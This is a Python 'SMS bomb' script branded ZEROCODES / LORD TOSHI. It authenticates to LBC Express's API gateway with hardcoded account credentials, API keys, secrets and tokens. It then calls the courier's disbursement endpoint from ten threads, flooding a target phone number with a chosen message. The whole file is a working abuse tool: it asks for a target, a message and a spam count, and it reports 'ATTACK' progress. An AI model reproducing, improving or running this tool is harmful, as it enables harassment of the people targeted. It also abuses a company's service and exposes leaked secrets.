import requests
import random
import string
import threading
from rich.console import Console
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text

console = Console()

def jwt():
    a = {
        "Client": "2E1EEB",
        "email": "natsumii@gmail.com",
        "password": "XI8cb8GmrQJwQZYiq6IkGA==:e6347773648dee3dee1bb37f6c6b07c6"
    }

    b = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'sec-ch-ua-platform': "\"Android\"",
        'lbcoakey': "d1ca28c5933f41638f57cc81c0c24bca",
        'sec-ch-ua': "\"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
        'token': "O8VpRnC2bIwe74mKssl11c0a1kz27aDCvIci4HIA+GOZKffDQBDkj0Y4kPodJhyQaXBGCbFJcU1CQZFDSyXPIBni",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://lbconline.lbcexpress.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://lbconline.lbcexpress.com/",
        'accept-language': "en-US,en;q=0.9,fil;q=0.8",
        'priority': "u=1, i"
    }

    response = requests.post("https://lbcapigateway.lbcapps.com/lexaapi/lexav1/api/GenerateJWTToken", json=a, headers=b)
    return response.text.replace('"', '')

def ctoken():
    authorization = jwt()

    a = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'sec-ch-ua-platform': "\"Android\"",
        'authorization': f"Bearer {authorization}",
        'ocp-apim-subscription-key': "dbcd31c8bc4f471188f8b6d226bb9ff7",
        'sec-ch-ua': "\"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
        'content-type': "application/json",
        'sec-ch-ua-mobile': "?1",
        'origin': "https://lbconline.lbcexpress.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://lbconline.lbcexpress.com/",
        'accept-language': "en-US,en;q=0.9,fil;q=0.8",
        'if-none-match': "W/\"323-0ixNV/FtbQVInvWoKc9AhviV3kU\"",
        'priority': "u=1, i"
    }

    response = requests.get("https://lbcapigateway.lbcapps.com/promotextertoken/generate_client_token", headers=a)
    if 'client_token' in response.json():
        return response.json()['client_token']

def generate_random_string(length=2):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def send(num, msg, jw, ctk):
    a = {
        "Recipient": "63" + num,
        "Message": msg,
        "ShipperUuid": "LBCEXPRESS",
        "DefaultDisbursement": 3,
        "ApiSecret": "03da764a333680d6ebd2f6f4ef1e2928",
        "apikey": "7777be96b2d1c6d0dee73d566a820c5f"
    }

    b = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36",
        'Accept-Encoding': "gzip, deflate, br, zstd",
        'Content-Type': "application/json",
        'ptxtoken': ctk,
        'sec-ch-ua-platform': "\"Android\"",
        'authorization': f"Bearer {jw}",
        'lbcoakey': "d1ca28c5933f41638f57cc81c0c24bca",
        'sec-ch-ua': "\"Chromium\";v=\"130\", \"Google Chrome\";v=\"130\", \"Not?A_Brand\";v=\"99\"",
        'sec-ch-ua-mobile': "?1",
        'token': "O8VpRnC2bIwe74mKssl11c0a1kz27aDCvIci4HIA+GOZKffDQBDkj0Y4kPodJhyQaXBGCbFJcU1CQZFDSyXPIBni",
        'origin': "https://lbconline.lbcexpress.com",
        'sec-fetch-site': "cross-site",
        'sec-fetch-mode': "cors",
        'sec-fetch-dest': "empty",
        'referer': "https://lbconline.lbcexpress.com/",
        'accept-language': "en-US,en;q=0.9,fil;q=0.8",
        'priority': "u=1, i",
        'Cookie': f"lexaRefreshTokenProd={jw}"
    }

    random_string = generate_random_string()
    a["Message"] = f"{msg}\n\n\n{random_string} - 𝗭𝗘𝗥𝗢𝗖𝗢𝗗𝗘𝗦"

    response = requests.post("https://lbcapigateway.lbcapps.com/lexaapi/lexav1/api/AddDefaultDisbursement", json=a, headers=b)

    return response.json()

def run():
    header = Panel(
        """
▒█▀▀▀█ ▒█▀▀▀ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀▄ ▒█▀▀▀ ▒█▀▀▀█ 　 
░▄▄▄▀▀ ▒█▀▀▀ ▒█▄▄▀ ▒█░░▒█ ▒█░░░ ▒█░░▒█ ▒█░▒█ ▒█▀▀▀ ░▀▀▀▄▄ 　 
▒█▄▄▄█ ▒█▄▄▄ ▒█░▒█ ▒█▄▄▄█ ▒█▄▄█ ▒█▄▄▄█ ▒█▄▄▀ ▒█▄▄▄ ▒█▄▄▄█ 
　 
              ▒█▀▀▀█ ▒█▀▄▀█ ▒█▀▀▀█ 
              ░▀▀▀▄▄ ▒█▒█▒█ ░▀▀▀▄▄ 
              ▒█▄▄▄█ ▒█░░▒█ ▒█▄▄▄█ 
              
           ▒█▀▀█ ▒█▀▀▀█ ▒█▀▄▀█ ▒█▀▀█ 
           ▒█▀▀▄ ▒█░░▒█ ▒█▒█▒█ ▒█▀▀▄ 
           ▒█▄▄█ ▒█▄▄▄█ ▒█░░▒█ ▒█▄▄█
""", 
        style="bold red on black", 
        expand=True,
        padding=(1, 2)
    )

    console.print(header)

    console.print("\n" + "[bold red]🔥 𝖫𝖮𝖱𝖣 𝖳𝖮𝖲𝖧𝖨 𝖲𝖬𝖲 𝖡𝖮𝖬𝖡 🔥[/bold red]")

    input_panel = Panel(
        "[italic]400 𝖫𝖨𝖥𝖤𝖳𝖨𝖬𝖤 𝖠𝖢𝖢𝖤𝖲𝖲 - 𝖳𝖮𝖲𝖧𝖨[/italic]", 
        style="bold red on black",  
        expand=True,
        padding=(1, 2)
    )
    console.print(input_panel)

    console.print("[bold red]TARGET NUMBER (EX : 91234567890):[/bold red]", end="")
    num = input()

    console.print("[bold red]ENTER YOUR MESSAGE:[/bold red]", end="")
    msg = input()

    while True:
        try:
            console.print("[bold red]SPAM COUNT :[/bold red]", end="")
            times = int(input()) 
            if times <= 0:
                console.print("[bold red]Please enter a number greater than 0.[/bold red]")
                continue
            break
        except ValueError:
            console.print("[bold red]Please enter a valid number.[/bold red]")

    
    jw = jwt()
    ctk = ctoken()

    try:
        with Progress() as progress:
            
            task = progress.add_task("[red]𝗔𝗧𝗧𝗔𝗖𝗞𝗜𝗡 𝗚", total=times)

            def send_message():
                for _ in range(times):
                    response = send(num, msg, jw, ctk)
                    progress.update(task, advance=1)
                    console.print(f"𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗡𝗗 : [bold red]{response}[/bold red]")

            threads = [threading.Thread(target=send_message) for _ in range(10)]
            for thread in threads:
                thread.start()
            for thread in threads:
                thread.join()

        console.print("[bold red]🔥 MESSAGE ATTACK COMPLETED SUCCESSFULLY 🔥[/bold red]")

    except Exception as e:
        console.print(f"[bold red]Error sending messages: {str(e)}[/bold red]")

if __name__ == '__main__':
    run()
